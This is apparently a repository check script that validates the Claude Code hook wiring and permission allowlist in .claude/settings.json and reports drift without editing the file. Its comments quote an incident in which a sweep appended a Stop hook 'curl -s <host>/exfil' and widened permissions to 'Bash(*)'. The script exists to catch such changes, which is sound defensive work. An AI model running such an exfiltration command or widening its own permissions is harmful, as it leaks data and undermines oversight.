/**
 * Gate over `.claude/settings.json`: the hook wiring, asserted rather than
 * assumed.
 *
 *   npm run check:hooks
 *
 * ## OBSERVATION BOUNDARY
 *
 * **IT READS A FILE. It cannot see whether the hooks RAN.** Everything below is
 * a claim about what `.claude/settings.json` declares on disk. Whether Claude
 * Code loaded that file, whether a user-level or enterprise settings file
 * overrode it, whether the session was started with hooks disabled, and whether
 * a hook exited 2 when it should have, are all invisible here. A perfectly
 * green run is compatible with enforcement being entirely off.
 *
 * That gap is not closeable by a gate: the evidence lives in a session's
 * transcript, not in the repo. The hooks' own behaviour is proven by PLANTING
 * against them (drive a `git add -A` and confirm the block), which is an act, an
 * artifact this gate cannot produce.
 *
 * **IT NEVER WRITES.** This gate reads `.claude/settings.json` and never edits
 * it. Hard rule 15 makes that file off limits without explicit instruction, and
 * a gate that repaired drift would be exactly the unattended edit the rule
 * forbids. Drift is REPORTED, and a person decides.
 *
 * It does not execute the hook scripts, so a `.sh` that exists and is broken
 * looks identical here to one that works.
 *
 * ## Why this exists
 *
 * Gate-backlog item 8: **enforcement silently off while looking on.** No script
 * read this file until now, and two real drifts were sitting in it, both
 * recorded in hard rule 15:
 *
 *   - The Stop hook ran a bare `npx tsc -b` while `package.json`'s `typecheck`
 *     runs `wrangler types && react-router typegen` first. A MIRROR of another
 *     file's contents, which is the anti-pattern this repo keeps paying for.
 *   - `scoped-git-add.sh` failed OPEN when python3 was missing.
 *
 * ## Derived, not restated, except where the value IS the contract
 *
 * The hook FILENAMES are taken out of the commands rather than listed, so a
 * renamed hook is caught by the existence check instead of by a stale literal.
 * The typecheck fragments are parsed out of `package.json`.
 *
 * The two MATCHERS are asserted by value, deliberately. A matcher is not
 * derivable from anything: it IS the contract, and "whatever the file happens to
 * say" is not an assertion. Same for the matcher-to-script BINDING: if the two
 * commands were swapped, every existence check here would still pass while the
 * dash checker guarded Bash and the git guard watched Write.
 *
 * FAILS CLOSED. A missing settings file, zero PreToolUse entries, zero Stop
 * hooks, or a `typecheck` script that parses to no fragments are each failures.
 */

import { existsSync, readFileSync, statSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const SETTINGS_PATH = join(root, ".claude", "settings.json");

/**
 * The matcher-to-hook binding, which is the actual enforcement claim.
 *
 * Asserted by value because it is not derivable: nothing else in the repo
 * records which tool each guard is supposed to watch. The script name is a
 * SUBSTRING of the command, so the path form and the quoting can change without
 * touching this.
 *
 * TWO DIFFERENT QUESTIONS, TWO CHECKS. `requires` is the enforcement floor: the
 * tools that MUST be watched, whatever else is. `matcher` is the exact string
 * currently recorded in the protected file. Before 2026-08-14 there was one
 * check doing both by string equality, and when `ef6be97` widened the matcher
 * from "Write|Edit" to "Write|Edit|Bash" it reported the guard as UNGUARDED
 * while the guard had in fact been WIDENED. That is hard rule 10's spelling
 * versus binding class, and it is why coverage is now computed by membership.
 *
 * Canon requires the Bash arm: capsid/conventions.md records the no-em-dash hook
 * as covering Write, Edit and Bash, including `git commit -m` and heredocs.
 *
 * A NOTE ON THE WORDING BELOW. Prose in this file must not read as raw SQL.
 * `check:invariants` section 5 matches its `LOOKS_LIKE_SQL` constant against the
 * whole file, then resolves the token after a row-write keyword as a table name,
 * so an ordinary English sentence can become a phantom statement and fail the
 * gate naming a column that never existed. Measured 2026-08-14: the first draft
 * of the drift message said "u" plus "pdate EXPECTED_HOOKS" and did exactly
 * that. The extractor is correctly broad, so the prose gives way, not the guard.
 */
const EXPECTED_HOOKS = [
  {
    matcher: "Write|Edit|Bash",
    requires: ["Write", "Edit", "Bash"],
    script: "no-em-dash.sh",
    guards: "em and en dashes in written content",
  },
  {
    matcher: "Bash",
    requires: ["Bash"],
    script: "scoped-git-add.sh",
    guards: "unscoped git add",
  },
];

/** The script package.json is expected to own, which the Stop hook must call. */
const TYPECHECK_SCRIPT = "typecheck";

let checks = 0;
let failures = 0;

/** @param {string} label @param {boolean} condition @param {string} [detail] */
function ok(label, condition, detail = "") {
  checks += 1;
  if (!condition) {
    failures += 1;
    console.log(`  FAIL  ${label}${detail ? `\n        ${detail}` : ""}`);
  }
}

console.log("\ncheck:hooks\n");

if (!existsSync(SETTINGS_PATH)) {
  console.log("  FAIL  .claude/settings.json is missing, so nothing below could run.\n");
  process.exit(1);
}

/** @type {any} */
let settings;
try {
  settings = JSON.parse(readFileSync(SETTINGS_PATH, "utf8"));
} catch (error) {
  console.log(
    `  FAIL  .claude/settings.json is not valid JSON, so Claude Code would ignore ` +
      `every hook in it: ${error instanceof Error ? error.message : String(error)}\n`,
  );
  process.exit(1);
}

const preToolUse = settings.hooks?.PreToolUse ?? [];
const stop = settings.hooks?.Stop ?? [];

/* --------------------------------------------------------- fail closed first */

ok(
  "settings.json declares PreToolUse hooks at all",
  Array.isArray(preToolUse) && preToolUse.length > 0,
  "no PreToolUse entries, so every matcher assertion below would pass vacuously",
);
ok(
  "settings.json declares a Stop hook at all",
  Array.isArray(stop) && stop.length > 0,
  "no Stop entries, so the typecheck assertions below would pass vacuously",
);
ok(
  `PreToolUse declares exactly the ${EXPECTED_HOOKS.length} expected entries`,
  preToolUse.length === EXPECTED_HOOKS.length,
  `found ${preToolUse.length}. An ADDED entry is not automatically wrong, but it is ` +
    `unreviewed enforcement and wants a line in this gate.`,
);

/* ------------------------------------------- each matcher, and what it guards */

/** @param {any} entry the command string of an entry's first hook, or "" */
function commandOf(entry) {
  const hooks = entry?.hooks ?? [];
  return String(hooks[0]?.command ?? "");
}

/**
 * The tools a matcher string watches. Claude Code splits it on "|".
 *
 * @param {unknown} matcher
 * @returns {string[]}
 */
function toolsOf(matcher) {
  return String(matcher ?? "")
    .split("|")
    .map((t) => t.trim())
    .filter(Boolean);
}

for (const expected of EXPECTED_HOOKS) {
  /*
   * Looked up by the SCRIPT it runs, not by its matcher string. The script is
   * the guard's identity; the matcher is a property of it that this gate then
   * asserts twice. Looking up by matcher is what made a widening indistinguish-
   * able from a removal.
   */
  const entry = preToolUse.find((/** @type {any} */ e) =>
    commandOf(e).includes(expected.script),
  );
  const label = `PreToolUse ${expected.script}`;
  const tools = toolsOf(entry?.matcher);
  const missing = expected.requires.filter((t) => !tools.includes(t));

  /*
   * COVERAGE. The enforcement question, and the ONLY check here entitled to the
   * word UNGUARDED: it fails when a tool that must be watched is not watched,
   * whether because the entry is absent or because the tool was dropped from
   * the matcher. Membership, not string equality, so widening the matcher can
   * never read as removing the guard.
   */
  ok(
    `${label}: COVERAGE, every required tool is watched`,
    Boolean(entry) && missing.length === 0,
    entry
      ? `the matcher is ${JSON.stringify(entry.matcher)}, which watches ${JSON.stringify(tools)}, ` +
        `so ${expected.guards} is UNGUARDED for ${JSON.stringify(missing)}.`
      : `no PreToolUse entry runs ${expected.script}, so ${expected.guards} is UNGUARDED entirely. ` +
        `Declared matchers: ${preToolUse.map((/** @type {any} */ e) => JSON.stringify(e?.matcher)).join(", ") || "(none)"}`,
  );
  if (!entry) continue;

  /*
   * TRIPWIRE. A different question: has the protected file moved at all. It
   * carries no enforcement claim, because a matcher can drift (reordered, or
   * widened again) while coverage is still complete. It exists so a change to
   * `.claude/settings.json`, which hard rule 15 puts off limits without explicit
   * instruction, cannot land unnoticed. Its message must never say unguarded:
   * saying so is what sent a previous session looking for a hole that was not
   * there.
   */
  ok(
    `${label}: TRIPWIRE, the recorded matcher is unchanged`,
    entry.matcher === expected.matcher,
    `protected-file drift: .claude/settings.json matcher differs from the recorded ` +
      `expectation. Recorded ${JSON.stringify(expected.matcher)}, found ` +
      `${JSON.stringify(entry.matcher)}. Coverage is asserted separately and is not ` +
      `what this check is about. If the change was intended, record the new matcher ` +
      `in EXPECTED_HOOKS in the same commit and say why.`,
  );

  const hooks = entry.hooks ?? [];
  ok(
    `${label}: carries exactly one command hook`,
    hooks.length === 1 && hooks[0]?.type === "command",
    `${hooks.length} hook(s), first type ${JSON.stringify(hooks[0]?.type ?? null)}`,
  );

  const command = commandOf(entry);

  /*
   * The path is taken OUT of the command rather than rebuilt from the expected
   * name, so a hook moved to another directory is caught here instead of this
   * gate cheerfully checking a file the command never runs.
   */
  const referenced = command.match(/\.claude\/hooks\/([\w.-]+\.sh)/)?.[1] ?? "";
  ok(
    `${label}: the command names a .sh under .claude/hooks/`,
    referenced.length > 0,
    `no .claude/hooks/*.sh path found in ${JSON.stringify(command)}`,
  );
  if (!referenced) continue;

  const scriptPath = join(root, ".claude", "hooks", referenced);
  const present = existsSync(scriptPath);
  ok(
    `${label}: ${referenced} is on disk`,
    present,
    `${scriptPath} does not exist, so the hook fires and immediately fails to find its script`,
  );
  ok(
    `${label}: ${referenced} is not empty`,
    present && statSync(scriptPath).size > 0,
    present ? `${referenced} is zero bytes` : "(absent, see above)",
  );
}

/* ---------------------------------------- the Stop hook, and the mirror drift */

/*
 * MIRRORS DRIFT; REGISTER THE SCRIPT. package.json owns what a typecheck IS,
 * and this repo has been bitten by that specific gap: the Stop hook ran a bare
 * `npx tsc -b` while `npm run typecheck` runs `wrangler types` and
 * `react-router typegen` first. The hook was therefore typechecking against
 * STALE generated types, and reported clean on a tree the real gate would have
 * rejected.
 *
 * `tsc --noEmit` is separately a NO-OP against this repo's solution-style root
 * config, which is why the script and not the compiler is the source of truth.
 */
const pkg = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
const typecheckCommand = String(pkg.scripts?.[TYPECHECK_SCRIPT] ?? "");

ok(
  `package.json still declares a ${TYPECHECK_SCRIPT} script`,
  typecheckCommand.length > 0,
  `there is no ${TYPECHECK_SCRIPT} script, so the Stop hook has nothing to delegate to ` +
    `and the assertions below would compare against an empty string`,
);

const fragments = typecheckCommand
  .split("&&")
  .map((part) => part.trim())
  .filter((part) => part.length > 0);

// NON-EMPTY SCOPE. An empty fragment list would make the restatement sweep
// below pass by examining nothing, which is the failure mode it exists to name.
ok(
  `the ${TYPECHECK_SCRIPT} script parses into fragments`,
  fragments.length > 0,
  `parsed 0 fragments out of ${JSON.stringify(typecheckCommand)}; the restatement ` +
    `sweep would examine nothing and report clean`,
);

const stopCommands = stop.flatMap((/** @type {any} */ entry) =>
  (entry?.hooks ?? []).map((/** @type {any} */ h) => String(h?.command ?? "")),
);

ok(
  "the Stop hook carries a command",
  stopCommands.length > 0 && stopCommands.every((/** @type {string} */ c) => c.length > 0),
  `${stopCommands.length} Stop command(s) found`,
);

/**
 * EXACTLY ONE Stop command today, tripwired.
 *
 * The pre-audit sweep appended a second one, `curl -s <host>/exfil`, and this
 * gate reported 22 checks and 0 failures while PRINTING "2 Stop command(s)".
 * Only `stopCommands[0]` was validated, so everything after the first was
 * unexamined: an arbitrary command running at the end of every session, in a
 * file this gate exists to police. A count tripwire plus a loop, not an index.
 */
const EXPECTED_STOP_COMMANDS = 1;

ok(
  `Stop declares exactly ${EXPECTED_STOP_COMMANDS} command`,
  stopCommands.length === EXPECTED_STOP_COMMANDS,
  `found ${stopCommands.length}: ${stopCommands.map((/** @type {string} */ c) => JSON.stringify(c)).join(", ")}. ` +
    `An added Stop command is not automatically wrong, but it runs at the end of ` +
    `every session and wants a line in this gate before it wants a line in settings.`,
);

// EVERY command, not the first. The loop is the fix; the index was the defect.
stopCommands.forEach((/** @type {string} */ command, /** @type {number} */ i) => {
  const label = stopCommands.length > 1 ? `Stop command ${i + 1}` : "the Stop hook";
  ok(
    `${label} invokes the repo's own ${TYPECHECK_SCRIPT} script`,
    new RegExp(`npm\\s+run\\s+(?:-s\\s+)?${TYPECHECK_SCRIPT}\\b`).test(command),
    `its command is ${JSON.stringify(command)}. It must run ` +
      `\`npm run -s ${TYPECHECK_SCRIPT}\` so that package.json stays the one place ` +
      `that defines what a typecheck is.`,
  );
  for (const fragment of fragments) {
    ok(
      `${label} does not restate the ${TYPECHECK_SCRIPT} fragment: ${fragment}`,
      !command.includes(fragment),
      `${JSON.stringify(command)} contains ${JSON.stringify(fragment)} verbatim. That is ` +
        `a MIRROR of package.json, and mirrors drift: this one ran only the last ` +
        `fragment and typechecked against stale generated types.`,
    );
  }
});

/* ----------------------------------------- the permission allowlist, by value */

/**
 * The committed allowlist, asserted BY VALUE in both directions.
 *
 * Not derivable from anything: it IS the contract. The sweep widened it to
 * `Bash(*)` and this gate reported 22 checks and 0 failures, because it never
 * looked at `permissions` at all. `Bash(*)` is every command this agent can run
 * without being asked, which is a larger grant than every hook here withholds.
 *
 * Both directions: an ADDED entry is an unreviewed grant, and a REMOVED one
 * means the file no longer says what this gate thinks it says.
 */
const EXPECTED_ALLOW = [
  "Bash(git:*)",
  "Bash(gh:*)",
  "Bash(npm:*)",
  "Bash(npx:*)",
  "Bash(wrangler:*)",
  "Bash(npx wrangler:*)",
];

const allow = settings.permissions?.allow ?? [];

ok(
  "permissions.allow is a non-empty list",
  Array.isArray(allow) && allow.length > 0,
  `got ${JSON.stringify(allow)}; an empty or missing list would make both sweeps below ` +
    `pass by comparing nothing`,
);

for (const entry of EXPECTED_ALLOW) {
  ok(
    `permissions.allow still grants ${entry}`,
    allow.includes(entry),
    `it is missing. If the grant was withdrawn deliberately, remove it from ` +
      `EXPECTED_ALLOW in the same commit.`,
  );
}
for (const entry of allow) {
  ok(
    `permissions.allow grants only reviewed entries: ${entry}`,
    EXPECTED_ALLOW.includes(String(entry)),
    `${JSON.stringify(entry)} is granted in settings but is not in this gate's reviewed ` +
      `list. Every widening is a decision; add it here with the same commit that adds it ` +
      `there, or remove it from settings.`,
  );
}

/* ------------------------------------------------------------------- report */

const referencedScripts = preToolUse
  .map((/** @type {any} */ e) => commandOf(e).match(/\.claude\/hooks\/([\w.-]+\.sh)/)?.[1])
  .filter(Boolean);

console.log(
  `  ${preToolUse.length} PreToolUse matcher(s), ${stopCommands.length} Stop command(s), ` +
    `${referencedScripts.length} hook script(s): ${referencedScripts.join(", ") || "(none)"}`,
);
console.log(
  `  ${TYPECHECK_SCRIPT} parses to ${fragments.length} fragment(s), each checked for restatement`,
);

console.log(`\n${checks} checks, ${failures} failures\n`);
process.exit(failures > 0 ? 1 : 0);
